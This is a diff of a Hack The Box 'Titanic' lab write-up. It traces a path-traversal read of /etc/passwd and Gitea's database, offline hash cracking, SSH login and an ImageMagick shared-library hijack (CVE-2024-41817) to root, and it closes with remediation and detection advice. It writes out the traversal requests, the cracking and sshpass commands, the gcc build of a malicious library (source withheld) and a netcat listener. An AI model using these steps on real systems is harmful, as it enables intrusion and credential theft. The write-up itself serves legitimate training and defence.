@@ -12,63 +12,102 @@ tags:
   - gitea
   - imagemagick
   - cve-2024-41817
+objective: "Turn an unsanitized download parameter into arbitrary file read, recover Gitea credentials for SSH access, and escalate through a scheduled ImageMagick process."
+tools:
+  - rustscan
+  - gobuster
+  - curl
+  - hashcat
+  - ssh
+  - sshpass
+  - netcat
+  - gcc
+  - magick
+skill: "Linux web exploitation and privilege escalation via path traversal and shared-library hijacking"
+outcome: "SSH access as the recovered Gitea user and a root context via an ImageMagick shared-library hijack (CVE-2024-41817)"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Easy |
+| Target environment | Ubuntu Linux; Apache httpd 2.4.52 fronting a Gitea service backed by SQLite |
+| Starting position | Unauthenticated network access |
+| Objective | Turn an unsanitized download parameter into arbitrary file read, recover Gitea credentials for SSH access, and escalate through a scheduled ImageMagick process |
+| Outcome | SSH access as the recovered Gitea user; root via an ImageMagick shared-library hijack (CVE-2024-41817) |
 
 ## Summary
 
-Titanic is a Hack The Box Linux lab. The notes report a path-traversal flaw in a download endpoint, access to Gitea configuration and database data, password recovery leading to SSH access, and an ImageMagick shared-library hijack leading to elevated access. Target identifiers, paths, account names, credentials, hashes, and lab secrets are replaced with role-based placeholders.
+Titanic is an Easy-rated Hack The Box Linux lab. An unsanitized `ticket` parameter in a download endpoint provides arbitrary file read, exposing Gitea's configuration and SQLite database and yielding password hashes that crack to an SSH login. A cron-driven image-identification script then runs a vulnerable ImageMagick build from a writable directory, where a planted shared library is loaded as root. Target and attacker addresses, hostnames, account names, file paths, credentials, and secrets are replaced with role-based placeholders; command syntax is preserved.
+
+**Attack path:** **Path-traversal file read → Gitea configuration and SQLite database exposure → offline hash cracking → SSH access → cron-driven ImageMagick shared-library hijack (CVE-2024-41817) → root**
 
 ## Context and Objective
 
-The notes report SSH and HTTP services, with the HTTP service redirecting to a lab hostname. Virtual-host enumeration identified a Gitea instance. Objective: trace documented attack path from exposed web functionality through authenticated access and privilege escalation within this lab.
+- **Target:** an Ubuntu Linux host exposing SSH (22) and Apache httpd 2.4.52 (80).
+- **Web application:** the HTTP service redirects to a lab hostname whose virtual-host namespace hosts a Gitea instance with repositories and a SQLite database backend.
+- **Starting position:** unauthenticated network access.
+- **Objective:** move from an externally reachable download parameter to authenticated access, then to root by abusing a scheduled image-processing job.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
-### Service and Virtual-Host Discovery
+### 1. Service and Virtual-Host Discovery
 
-**Observation.** The notes report SSH and Apache HTTP services, plus a Gitea virtual host.
-
-**Action.** Service and virtual-host enumeration used representative scans:
+Observation: a fast TCP scan exposes SSH and an Apache web server, and the site redirects to a lab hostname.
 
 ```bash
 rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV
+```
+
+Truncated scan output:
+
+```text
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://<TARGET_HOSTNAME>/
+```
+
+With the hostname mapped locally, virtual-host enumeration reveals an additional application host:
+
+```bash
 gobuster vhost --url http://<TARGET_HOSTNAME> --wordlist <SUBDOMAIN_WORDLIST> --append-domain -r
 ```
 
 ```text
-22/tcp open  ssh
-80/tcp open  http
 Found: <GITEA_VHOST> Status: 200
 ```
 
-**Technical significance.** The virtual host narrowed web review to a separate application surface.
+Significance: the virtual host exposes a separate application surface that the default hostname does not serve directly, so review focuses there.
 
-**Result.** The notes report that the discovered virtual host hosted Gitea.
+Result: the source identifies this virtual host as hosting a Gitea instance.
 
-### File-Read Validation
+### 2. File-Read Validation
 
-**Observation.** The notes report that the download endpoint accepted an unsanitized `ticket` value.
+Observation: the main application exposes a download endpoint that passes the `ticket` value to the filesystem without canonicalization.
 
-**Action.** A representative request tested a system-file path:
+Action: a representative request supplies a system-file path.
 
 ```text
-http://<TARGET_HOSTNAME>/download?ticket=<SYSTEM_FILE>
+http://<TARGET_HOSTNAME>/download?ticket=/etc/passwd
 ```
 
 ```text
 root:x:0:0:root:<REDACTED>
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 ...
 ```
 
-**Technical significance.** Returning file content establishes arbitrary file-read impact and enables review of application-side configuration.
+Significance: returning arbitrary file content establishes a path-traversal file-read primitive and exposes system file content.
 
-**Result.** The notes report that this request confirmed path traversal.
+Result: the request confirms path traversal.
 
-### Gitea Configuration and Database Access
+### 3. Gitea Configuration and Database Access
 
-**Observation.** The notes report that repository configuration exposed the Gitea data-volume layout.
+Observation: the file-read primitive reaches the Gitea data directory.
 
-**Action.** The file-read primitive retrieved configuration and database material; a hash-extraction utility then processed the database:
+Action: read the configuration, retrieve the SQLite database, and extract password-verification material.
 
 ```bash
 curl "http://<TARGET_HOSTNAME>/download?ticket=<GITEA_CONFIG_PATH>"
@@ -76,89 +115,113 @@ curl "http://<TARGET_HOSTNAME>/download?ticket=<GITEA_DATABASE_PATH>" --output g
 python3 <GITEA_HASH_EXTRACTOR> gitea.db
 ```
 
-```text
+```ini
 [database]
+PATH = /data/gitea/gitea.db
 DB_TYPE = sqlite3
-<LAB_USER>:<PASSWORD_HASH>
 ```
 
-**Technical significance.** Configuration identified SQLite as the backend; database access exposed password-verification material for offline review.
+```text
+<LAB_ADMIN>:sha256:50000:<HASH_1>
+<LAB_USER>:sha256:50000:<HASH_2>
+```
 
-**Result.** The notes report recovery of two user password hashes from the Gitea database.
+Significance: the configuration identifies SQLite as the backend, and the database exposes password-verification material for offline review.
 
-### Password Recovery and SSH Access
+Result: two user password hashes are recovered from the Gitea database.
 
-**Observation.** The notes report that one recovered hash matched a common-wordlist candidate.
+### 4. Password Recovery and SSH Access
 
-**Action.** The recovered data was tested offline, then used for SSH authentication:
+Observation: one recovered hash matches a candidate in a common wordlist.
+
+Action: crack the hashes offline, then authenticate over SSH with the recovered password.
 
 ```bash
 hashcat <HASH_FILE> <WORDLIST> -D2 --username
-ssh <LAB_USER>@<TARGET_HOSTNAME>
+sshpass -p '<LAB_USER_PASSWORD>' ssh <LAB_USER>@<TARGET_HOSTNAME>
 ```
 
 ```text
-<LAB_USER>:<LAB_USER_PASSWORD>
+sha256:50000:...:<LAB_USER_PASSWORD>
+```
+
+```text
 <LAB_USER>@<TARGET_HOSTNAME>:~$
 ```
 
-**Technical significance.** Offline password recovery converted application data exposure into authenticated operating-system access.
+Significance: offline password recovery converts application data exposure into authenticated operating-system access.
 
-**Result.** The notes report SSH access as the recovered lab user using that password.
+Result: a shell is obtained over SSH as the recovered Gitea user.
 
-### Scheduled Image Processing Discovery
+### 5. Scheduled Image Processing Discovery
 
-**Observation.** The notes report a scheduled image-identification script that ran ImageMagick from a predictable image directory.
-
-**Action.** Local enumeration inspected the script and ImageMagick version:
+Observation: local review finds a cron-triggered script that runs ImageMagick from a predictable image directory.
 
 ```bash
 cat <IMAGE_IDENTIFICATION_SCRIPT>
 magick --version
 ```
 
+```bash
+cd <IMAGE_DIRECTORY>
+truncate -s 0 metadata.log
+find <IMAGE_DIRECTORY>/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
+```
+
 ```text
-find <IMAGE_DIRECTORY> -type f -name "*.jpg" | xargs /usr/bin/magick identify
 ImageMagick 7.1.1-35
 ```
 
-**Technical significance.** A privileged scheduled process operating from a writable, predictable directory can make runtime library loading security-critical.
+Significance: a privileged scheduled process running from a writable, predictable directory makes runtime library resolution security-critical, because ImageMagick searches its working directory for configuration and shared libraries.
 
-**Result.** The notes report that this version was vulnerable to CVE-2024-41817.
+Result: the installed build (7.1.1-35) falls within the affected range for CVE-2024-41817.
 
-### ImageMagick Shared-Library Hijacking
+### 6. ImageMagick Shared-Library Hijacking
 
-**Observation.** The notes report that ImageMagick loaded `libxcb.so.1` while processing images and that the scheduled process ran with elevated privileges.
+Observation: ImageMagick loads `libxcb.so.1` at runtime, and the image-identification script runs with elevated privileges.
 
-**Action.** The notes describe placing a malicious shared library in the image-processing working directory and waiting for scheduled processing. Unsafe constructor and reverse-shell details are intentionally omitted; the representative listener pattern is retained:
+Action: a malicious shared library is compiled and placed in the image directory so the scheduled process loads it in place of the system library. The constructor and reverse-shell specifics are summarized rather than reproduced; the representative listener pattern is retained.
 
 ```bash
-nc -lvnp <LISTENER_PORT>
+gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+<MALICIOUS_LIBRARY_SOURCE>
+EOF
+
+nc -nlvp <LISTENER_PORT>
 ```
 
 ```text
 <ROOT_USER>@<TARGET_HOSTNAME>:<IMAGE_DIRECTORY>#
 ```
 
-**Technical significance.** CVE-2024-41817 allowed attacker-controlled library code to execute in the scheduled ImageMagick process context.
+Significance: CVE-2024-41817 lets an attacker-controlled library in the working directory execute inside the scheduled ImageMagick process, which here runs as root.
 
-**Result.** The notes report that scheduled processing produced an elevated shell.
+Result: the scheduled processing returns an elevated shell in the root context.
 
 ## Challenges and Decisions
 
-No challenges or decision points are included because the source notes do not document them.
+The source records no failed attempts, tradeoffs, or fixes for this machine.
 
 ## Outcome
 
-The notes report complete lab compromise through path traversal, Gitea database access, offline password recovery, SSH access, and ImageMagick shared-library hijacking. Recorded command output supports service discovery, file-read validation, SQLite identification, password recovery, SSH access, ImageMagick version identification, and an elevated shell. The notes do not provide independent reproduction evidence beyond their recorded commands and excerpts.
+The evidence establishes authenticated SSH access as the recovered Gitea user and a root context obtained through the scheduled ImageMagick process. Limitation: the malicious library source is summarized, so the payload is not reproducible from this writeup.
 
 ## Lessons and Recommendations
 
-- **Recommendation:** Canonicalize download paths, enforce an allowlist of intended files, and reject traversal sequences before file access.
-- **Recommendation:** Keep credentials and database connection settings out of repository history; rotate any exposed values.
-- **Recommendation:** Enforce unique, resistant passwords and prevent recovered application credentials from authenticating to operating-system accounts.
-- **Recommendation:** Upgrade vulnerable ImageMagick releases and ensure scheduled jobs run from controlled directories with least privilege.
+The actions below are recommendations; none was validated in the lab.
+
+1. **Unsanitized download parameter (path traversal).** The `ticket` value reached the filesystem without canonicalization, enabling arbitrary file read that exposed Gitea configuration and its SQLite database. *Recommendation:* resolve requested paths inside an allowlisted base directory, reject traversal sequences, and never pass user input directly to file APIs. *Detection:* alert on `ticket` values containing traversal sequences or absolute paths.
+2. **Sensitive material exposed to file read.** Password-verification hashes were recovered from the Gitea database through the same primitive and cracked offline because a user relied on a weak, guessable password that then authenticated over SSH. *Recommendation:* keep database and application files outside web-readable paths, enforce unique high-entropy credentials, and never reuse an application password for operating-system authentication. *Detection:* monitor for credential reuse across services and for logins by application accounts from unexpected sources.
+3. **Root-scheduled ImageMagick from a writable directory.** A cron job ran a vulnerable ImageMagick build (CVE-2024-41817) from a directory the low-privileged user could write, so a planted `libxcb.so.1` was loaded and executed as root. *Recommendation:* run scheduled image work from root-owned directories, restrict library resolution to trusted absolute paths, apply the vendor fix (7.1.1-36 or later), and drop privileges for non-essential processing. *Detection:* monitor the image directory for unexpected shared objects or configuration files and alert on library loads from writable paths.
+4. **Credentials disclosed in version control.** A `docker-compose.yml` commit in the Gitea project exposed MySQL credentials that were not used in this attack path, an unnecessary exposure rather than a demonstrated compromise. *Recommendation:* keep secrets out of version control, rotate anything ever committed, and scan repository history with a secret scanner.
 
 ## References
 
-- Hack The Box [Titanic](https://app.hackthebox.com/machines/Titanic) lab.
+- [Hack The Box — Titanic](https://app.hackthebox.com/machines/Titanic) (retired machine)
+- [NVD — CVE-2024-41817](https://nvd.nist.gov/vuln/detail/CVE-2024-41817) (ImageMagick arbitrary code execution by loading a malicious shared library from the working directory)
+- [GitHub Advisory — GHSA-8rxc-922v-phg8](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8) (ImageMagick vendor advisory, fixed in 7.1.1-36)
+- [RustScan](https://github.com/RustScan/RustScan)
+- [Gobuster](https://github.com/OJ/gobuster)
+- [Hashcat](https://hashcat.net/hashcat/)
+- [sshpass](https://sourceforge.net/projects/sshpass/)
+- [ImageMagick command-line tools](https://imagemagick.org/script/command-line-tools.php)
